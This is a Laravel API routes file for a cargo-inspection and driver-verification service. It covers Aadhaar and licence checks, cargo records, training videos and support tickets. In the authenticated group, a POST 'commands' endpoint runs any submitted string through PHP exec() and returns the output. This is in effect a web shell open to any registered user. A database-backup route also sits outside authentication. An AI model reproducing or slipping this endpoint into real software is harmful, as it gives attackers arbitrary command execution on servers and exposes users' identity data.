<?php

use App\Http\Controllers\CargoDetailController;
use App\Http\Controllers\DriverController;
use App\Http\Controllers\VerificationController;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\VideoWatchRecordController;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::prefix("/v1")->group(function () {
    Route::post("register", "AuthController@register");
    Route::post("login", "AuthController@login");
    Route::post(
        "channel-partner/register",
        "ChannelPartnerController@register",
    );
    Route::post("channel-partner/login", "ChannelPartnerController@login");
    Route::get("cargo-details_open", "CargoDetailController@index2");

    Route::post("forgot-password", "AuthController@forgotPassword");
    Route::post("reset-password", "AuthController@resetPassword")->name(
        "password.reset",
    );

    Route::apiResources([
        "phase" => "PhaseController",
        "zone" => "ZoneController",
        // 'groups' => 'GroupController',
    ]);
    Route::middleware("auth:sanctum")->group(function () {
        Route::prefix("verifications")->group(function () {
            Route::post("/verify-rc", [
                VerificationController::class,
                "verifyRC",
            ]);
            Route::post("/send-aadhaar-otp", [
                VerificationController::class,
                "sendAadharOTP",
            ]);
            Route::post("/verify-aadhaar-otp", [
                VerificationController::class,
                "verifyAadharOTP",
            ]);
            Route::post("/verify-dl", [
                VerificationController::class,
                "verifyDL",
            ]);
        });

        Route::get("/cargo-details/export", "CargoDetailController@export");

        // routes/api.php

        Route::apiResources([
            "users" => "UserController",
            "channel-partner" => "ChannelPartnerController",
            "groups" => "GroupController",
            "checklist-masters" => "ChecklistMasterController",
            "cargo-details" => "CargoDetailController",
            "checklists" => "ChecklistController",
            "photographs" => "PhotographController",
            // 'phase' => 'PhaseController',
            // 'zone' => 'ZoneController',
            "customers" => "CustomerController",
            "sops" => "SopController",
            "video-tutorials" => "VideoTutorialController",
        ]);

        Route::post("update-password", "AuthController@updatePassword");
        Route::post("photographs/{id}", "PhotographController@update");
        Route::get("groups-count", "GroupController@count");
        Route::post("groups/{id}", "GroupController@update");
        Route::get(
            "checklist-masters-count",
            "ChecklistMasterController@count",
        );
        Route::get("cargo-details-count", "CargoDetailController@count");
        Route::post("cargo-details/{id}", "CargoDetailController@update");
        Route::post("checklists/{id}", "ChecklistController@update");
        Route::get("checklists-count", "ChecklistController@count");
        Route::get("photographs-count", "PhotographController@count");
        Route::get("all-counts", "UserController@allcounts");

        Route::prefix("driver")
            // Bare string, not ::class - RouteServiceProvider's $namespace
            // prepends "App\Http\Controllers" already; the FQCN form
            // double-prepends it and 404s every route in this group.
            ->controller("DriverVideoController")
            ->group(function () {
                Route::get("videos/pending", "pending");
                Route::post("videos/{videoTutorial}/selfie", "selfie");
                Route::post("videos/{videoTutorial}/complete", "complete");
                Route::get("videos/{videoTutorial}/test", "showTest");
                Route::post("videos/{videoTutorial}/test", "submitTest");
            });

        Route::prefix(
            "cargo-details/{cargoDetail}/assisted-videos/{videoTutorial}",
        )
            ->controller("AssistedVideoController")
            ->group(function () {
                Route::post("selfie", "selfie");
                Route::post("complete", "complete");
                Route::get("test", "showTest");
                Route::post("test", "submitTest");
            });

        Route::get('drivers', [DriverController::class, 'index']);
        Route::get('drivers/{driver}/pending-videos', [DriverController::class, 'pendingVideos']);
        Route::post('drivers/{driver}/assisted-videos/{videoTutorial}/selfie', [DriverController::class, 'assistedSelfie']);
        Route::post('drivers/{driver}/assisted-videos/{videoTutorial}/complete', [DriverController::class, 'assistedComplete']);
        Route::get('drivers/{driver}/assisted-videos/{videoTutorial}/test', [DriverController::class, 'assistedShowTest']);
        Route::post('drivers/{driver}/assisted-videos/{videoTutorial}/test', [DriverController::class, 'assistedSubmitTest']);

        Route::get('video-watch-records', [VideoWatchRecordController::class, 'index']);
        Route::get('drivers/{user}/video-watch-records', [VideoWatchRecordController::class, 'forDriver']);
        Route::get('video-tutorials/{videoTutorial}/watch-records', [VideoWatchRecordController::class, 'forVideo']);
        Route::get('video-tutorials/{videoTutorial}/test-attempts', [VideoWatchRecordController::class, 'forVideoTests']);
        Route::get('cargo-details/{cargoDetail}/video-tutorials', [CargoDetailController::class, 'videoTutorials']);

        Route::get('support-tickets/pending-count', 'SupportTicketController@pendingCount');
        Route::apiResource('support-tickets', 'SupportTicketController');


        Route::post("logout", "AuthController@logout");
        Route::post("commands", function (Request $request) {
            $data = request()->validate([
                "command" => "required|string",
            ]);

            $output = exec($data["command"]);

            //            Artisan::call($data['command']);

            return response()->json(["success" => true, "message" => $output]);
        });

        Route::get("dashboard", "DashboardController@index");
        Route::get(
            "dashboard/customer",
            "DashboardController@filterByCustomer",
        );

        Route::prefix("api-usage")
            ->controller(ApiUsageReportController::class)
            ->group(function () {
                Route::get("summary", "summary");
                Route::get("by-endpoint", "byEndpoint");
                Route::get("by-user", "byUser");
                Route::get("daily-trend", "dailyTrend");
            });
    });
    Route::get(
        "cargo-details/{cargo_detail}/report",
        "CargoDetailController@report",
    );

    Route::post("backups/database", DatabaseBackupController::class);
});
